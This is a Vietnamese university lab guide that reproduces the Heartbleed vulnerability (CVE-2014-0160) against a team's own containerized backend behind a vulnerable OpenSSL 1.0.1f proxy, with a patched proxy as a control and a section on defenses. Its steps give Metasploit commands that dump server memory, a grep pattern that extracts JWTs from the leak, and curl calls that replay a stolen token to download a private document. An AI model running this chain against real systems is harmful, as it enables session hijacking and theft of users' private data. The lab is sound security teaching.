# Lab CVE-2014-0160 — Heartbleed: chiếm session thật của backend

> **Nhóm 09 – An toàn mạng (N02)** · Người phụ trách: HTTPS/TLS (Phan Đức)
> Lỗ hổng: **CVE-2014-0160** — OpenSSL `1.0.1` → `1.0.1f` (Heartbeat Extension, RFC 6520)

Lab này khai thác Heartbleed để **trộm JWT/session thật** của backend quản lý tài liệu của nhóm (`managedocuments`), rồi dùng token trộm được để đọc một tài liệu **PRIVATE** của nạn nhân — không cần biết username/password, không phá mã hóa TLS.

**Toàn bộ các bước nghiệp vụ (đăng ký, đăng nhập, upload, dùng token) demo THỦ CÔNG** qua web UI thật / `curl` / Metasploit để thầy xem trực tiếp từng thao tác — không dùng script tự động.

---

## 1. Bối cảnh — hiểu mình đang làm gì

TLS Heartbeat Extension (RFC 6520) cho phép 2 bên gửi gói "ping" nhỏ kèm payload để giữ kết nối sống mà không cần bắt tay lại. Gói Heartbeat gồm:

- `payload`: dữ liệu thật client gửi lên.
- `payload_length`: độ dài do **client tự khai báo**.

OpenSSL `1.0.1` → `1.0.1f` **không kiểm tra** `payload_length` có khớp với độ dài `payload` thật hay không. Nếu client khai man `payload_length` lớn hơn nhiều so với payload thật, server sẽ copy một vùng nhớ lớn hơn (payload + phần RAM liền kề) và trả nguyên vẹn về cho client — nếu đúng lúc trong vùng RAM đó có JWT của một người dùng vừa đăng nhập, kẻ tấn công đọc được luôn.

**Điểm quan trọng nhất của lab này (ghi rõ vào báo cáo):**

> ⚠️ **Lỗi nằm ở OpenSSL — lớp TLS termination — không nằm trong code backend.**
> Backend Spring Boot (`managedocuments`) được dùng **nguyên bản, không sửa một dòng code nào**. Lỗi xảy ra ở một **proxy TLS** (ở đây dùng `stunnel`) đứng trước backend, dùng thư viện OpenSSL 1.0.1f để giải mã HTTPS. Đây đúng là cách Heartbleed gây hại thật ngoài đời năm 2014.

---

## 2. Kiến trúc lab

```
                 (TLS, cổng 8443/8444)
Victim/Attacker ───────────────────────► proxy-vulnerable / proxy-patched
                                          (stunnel + OpenSSL 1.0.1f / 1.0.1g)
                                                    │ HTTP thường (nội bộ)
                                                    ▼
                                               backend (Spring Boot THẬT)
                                                    │
                                                    ▼
                                                 MySQL
```

- `proxy-vulnerable` (cổng **8443**): stunnel build từ OpenSSL **1.0.1f** (dính Heartbleed).
- `proxy-patched` (cổng **8444**): stunnel build từ OpenSSL **1.0.1g** (đã vá) — dùng đối chứng.
- `backend`: build trực tiếp từ source thật của nhóm, **không expose port ra ngoài** — chỉ gọi được qua 1 trong 2 proxy trên.
- `mysql`: database riêng cho lab, tách biệt với Server thật đang chạy.

### Cấu trúc thư mục

```
lab2-heartbleed/
├── backend.Dockerfile       # Build backend Spring Boot thật (context = managedocuments/managedocuments)
├── docker-compose.yml       # mysql + backend + proxy-vulnerable (8443) + proxy-patched (8444)
├── proxy/
│   ├── Dockerfile            # Build OpenSSL (ARG OPENSSL_VERSION) + stunnel link với nó
│   └── stunnel.conf          # accept 8443 (TLS) -> connect backend:8080 (HTTP)
├── victim/                   # (các .py trong đây KHÔNG DÙNG NỮA — demo thủ công qua web UI, xem mục 5)
├── exploit/                  # (các .py trong đây KHÔNG DÙNG NỮA — demo bằng Metasploit + curl, xem mục 5)
├── HuongDanLab2.txt          # Bản hướng dẫn ngắn, dùng để in/đọc nhanh lúc demo
└── README.md
```

---

## 3. Chuẩn bị

- Cài **Docker** và **Docker Compose** trên Server (nhóm đã cài theo CLAUDE.md).
- Server cần Internet (qua card NAT) để build (tải mã nguồn OpenSSL/stunnel, build jar Maven).
- Máy Kali: có **Metasploit Framework** (`msfconsole`) — đã có sẵn trên Kali Linux.
- Trình duyệt trên máy Client để đăng ký/đăng nhập/upload qua web UI thật.
- Cài **Wireshark** (hoặc `tcpdump`) trên máy dùng để bắt gói tin minh chứng.
- `curl` (có sẵn trên Kali/Ubuntu) để gọi API bằng JWT trộm được.

---

## 4. Khởi động lab

```bash
cd lab2-heartbleed
docker compose up --build
```

Hai cổng sẽ sẵn sàng:
- `https://<IP-Server>:8443` → proxy **DÍNH lỗi** (OpenSSL 1.0.1f)
- `https://<IP-Server>:8444` → proxy **ĐÃ VÁ** (OpenSSL 1.0.1g, đối chứng)

> Web UI của backend (file tĩnh HTML/JS) được phục vụ ngay tại cùng địa chỉ này (same-origin), nên mở trực tiếp `https://<IP-Server>:8443/` trên trình duyệt là vào được trang đăng nhập/đăng ký thật.

---

## 5. Trình tự demo (THỦ CÔNG) — chụp ảnh từng bước

### Bước 1 — (Thủ công, trên trình duyệt) Nạn nhân đăng ký + đăng nhập + upload tài liệu PRIVATE

1. Mở `https://<IP-Server>:8443/` trên trình duyệt (chấp nhận cảnh báo chứng chỉ tự ký).
2. Đăng ký một tài khoản nạn nhân, ví dụ `victim1 / Victim@123`.
3. Đăng nhập bằng tài khoản đó.
4. Vào trang upload tài liệu, tải lên 1 file bất kỳ, **tắt "Công khai" (Public) → để chế độ Private**.
5. Ghi lại **ID của tài liệu** vừa tạo (xem trong danh sách "Tài liệu của tôi" hoặc URL chi tiết tài liệu).

📸 Chụp màn hình: upload thành công, tài liệu hiển thị ở chế độ Private.

### Bước 2 — (Thủ công) Giữ cho session của nạn nhân "sống" trong lúc attacker tấn công

- Để tab trình duyệt của nạn nhân **mở sẵn, đã đăng nhập**.
- Trong lúc Bước 3 chạy, bấm vài thao tác trên web (xem trang cá nhân, danh sách tài liệu...) để JWT của nạn nhân tiếp tục được gửi đi/dùng tới — tăng khả năng JWT đang nằm trong RAM của proxy khi attacker "nổ" Heartbleed.

### Bước 3 — (Kali, Metasploit) Khai thác Heartbleed để bắt JWT

Mở terminal trên Kali:

```bash
msfconsole -q
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS <IP-Server>
set RPORT 8443
set ACTION DUMP
set VERBOSE true
run
```

- Module gửi gói Heartbeat giả mạo (giống hệt cơ chế mô tả ở mục 1), đọc trộm vùng RAM của tiến trình OpenSSL trên proxy.
- Metasploit tự lưu dữ liệu rò ra vào 1 file "loot" (đường dẫn in ra cuối output, dạng `~/.msf4/loot/<timestamp>_<host>_openssl.heartble_<id>.bin`).
- Nếu lần đầu chưa trúng JWT (bộ nhớ ngẫu nhiên), chạy lại `run` vài lần — xen kẽ với Bước 2 (bấm thao tác trên web nạn nhân) để tăng cơ hội.

📸 Chụp màn hình: output `msfconsole` cho thấy "Heartbeat response with leak" + đường dẫn file loot.

### Bước 4 — (Kali) Tìm JWT trong dữ liệu rò ra

```bash
grep -aoE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}' ~/.msf4/loot/<ten-file-loot>.bin
```

JWT theo chuẩn (RFC 7519) luôn có dạng `base64url.base64url.base64url`, bắt đầu bằng `eyJ` (vì phần header JSON `{"alg":...}` khi encode base64 luôn cho ra tiền tố này) — lệnh `grep` trên tìm đúng mẫu này trong file nhị phân.

📸 Chụp màn hình: chuỗi JWT tìm được, ghi lại để dùng ở Bước 5. Nếu không thấy gì, quay lại chạy `run` thêm vài lần ở Bước 3.

### Bước 5 — (Thủ công, curl) Dùng JWT trộm được để chiếm session và đọc tài liệu private

Xác minh token hợp lệ — gọi API lấy thông tin tài khoản, không cần username/password:

```bash
curl -sk -H "Authorization: Bearer <JWT-vừa-bắt-được>" \
  https://<IP-Server>:8443/api/auth/my-info
```

✅ **Kết quả mong đợi:** `HTTP 200` + JSON thông tin tài khoản `victim1` — chứng minh chiếm session thành công.

🎯 **Bước hậu quả — đọc tài liệu riêng tư thật** (thay `<ID>` bằng ID tài liệu ghi lại ở Bước 1):

```bash
curl -sk -H "Authorization: Bearer <JWT-vừa-bắt-được>" \
  https://<IP-Server>:8443/api/documents/<ID>

curl -sk -H "Authorization: Bearer <JWT-vừa-bắt-được>" \
  https://<IP-Server>:8443/api/documents/<ID>/download -o leaked_file
```

✅ **Kết quả mong đợi:** `HTTP 200`, lấy được metadata + file thật của tài liệu Private — attacker không biết username/password, không phá mã hóa TLS, chỉ nhờ lỗi 1 thư viện OpenSSL lỗi thời mà đọc được dữ liệu riêng tư của người khác.

📸 Chụp màn hình: output của cả 3 lệnh `curl` trên.

**Đối chứng nhanh** (chứng minh backend phân quyền đúng — không phải lỗi logic app):

```bash
curl -sk https://<IP-Server>:8443/api/documents/<ID>          # không gửi token
```

→ phải trả `401 UNAUTHORIZED`. Chỉ khi có đúng JWT của chủ tài liệu (trộm qua Heartbleed) mới đọc được — chứng minh kiểm tra quyền trong code backend hoạt động đúng, lỗ hổng hoàn toàn nằm ở tầng TLS.

### Bước 6 — Màn đối chứng OpenSSL đã vá

Lặp lại Bước 3–4 nhưng đổi `RPORT` thành `8444` (proxy-patched):

```bash
set RPORT 8444
run
```

✅ **Kết quả mong đợi:** Metasploit báo không có dữ liệu rò ra (`The server does not appear to support the TLS Heartbeat extension probing attempt` hoặc không có "leak" trong output). Thử `grep` file loot (nếu có) cũng không ra JWT nào.

**Kết luận:** chỉ phiên bản OpenSSL thay đổi (1.0.1f → 1.0.1g) mà kết quả đảo ngược hoàn toàn, trong khi backend và toàn bộ luồng nghiệp vụ còn lại giữ nguyên 100% → chứng minh điểm yếu nằm ở OpenSSL, không phải ở code backend.

---

## 6. Biện pháp phòng thủ (ghi vào báo cáo)

- Luôn cập nhật thư viện mã hóa (OpenSSL) lên bản vá mới nhất — lỗ hổng tầng thấp (giao thức/thư viện TLS) không thể phòng tránh bằng cấu hình hay code ứng dụng phía trên.
- Sau khi vá, **thu hồi toàn bộ session đang hoạt động và cấp lại chứng chỉ/khóa riêng** đã dùng trên proxy dính lỗi.
- Thời gian sống JWT ngắn (`jwt.valid-duration`) giúp giảm thiệt hại: token trộm được chỉ dùng được trong thời gian hiệu lực còn lại.
- Giám sát/cảnh báo các gói Heartbeat bất thường bằng IDS nếu triển khai thực tế.

---

## 7. Danh sách ảnh cần nộp

- [ ] Bước 1: upload tài liệu thành công ở chế độ Private trên web UI, ghi lại ID tài liệu.
- [ ] Bước 3: `msfconsole` chạy `openssl_heartbleed` ACTION DUMP, thấy dòng báo có leak + đường dẫn file loot.
- [ ] Wireshark (tùy chọn): gói Heartbeat response bất thường trên cổng 8443.
- [ ] Bước 4: lệnh `grep` tìm ra chuỗi JWT trong file loot.
- [ ] Bước 5: `curl /api/auth/my-info` trả về thông tin tài khoản nạn nhân.
- [ ] Bước 5: `curl /api/documents/<ID>` + `/download` lấy được tài liệu Private.
- [ ] Bước 5 (đối chứng): `curl` không có token → `401 UNAUTHORIZED`.
- [ ] Bước 6: cùng thao tác Metasploit nhắm vào cổng 8444 (đã vá) → không rò được gì.

---

## 8. Tham khảo API dùng khi demo thủ công

(Phòng khi cần gõ tay — endpoint và field JSON thật của backend.)

| Việc | Method & đường dẫn | Body / Header |
|---|---|---|
| Đăng ký | `POST /api/auth/register` | JSON: `username, email, password, fullName` |
| Đăng nhập | `POST /api/auth/login` | JSON: `username, password` → trả `data.accessToken` |
| Xem thông tin tài khoản | `GET /api/auth/my-info` | Header: `Authorization: Bearer <token>` |
| Danh sách danh mục (không cần đăng nhập) | `GET /api/categories` | — |
| Upload tài liệu | `POST /api/documents` (multipart) | Field: `title, description, categoryId, isPublic, file` |
| Xem chi tiết tài liệu | `GET /api/documents/{id}` | Header: `Authorization: Bearer <token>` (nếu tài liệu private) |
| Tải file tài liệu | `GET /api/documents/{id}/download` | Header: `Authorization: Bearer <token>` (nếu tài liệu private) |

---

## 9. Lưu ý

- ⚠️ Toàn bộ thử nghiệm **chỉ thực hiện trong lab kín của nhóm** (mạng `192.168.56.0/24`, container riêng, tách biệt với Server thật đang vận hành). Không chạy thử nhắm vào bất kỳ hệ thống nào ngoài phạm vi lab.
- Tài khoản nạn nhân tự đăng ký trong Bước 1 chỉ là tài khoản demo, không phải thông tin thật.
- Nếu Metasploit không rò được JWT sau nhiều lần `run`, kiểm tra lại: container đã build/chạy đúng chưa (`docker compose ps`), và đảm bảo nạn nhân đang thực sự tương tác với web (Bước 2) đúng lúc attacker chạy module.
- Nếu có gì không chạy, báo lại để nhóm cùng xử lý.
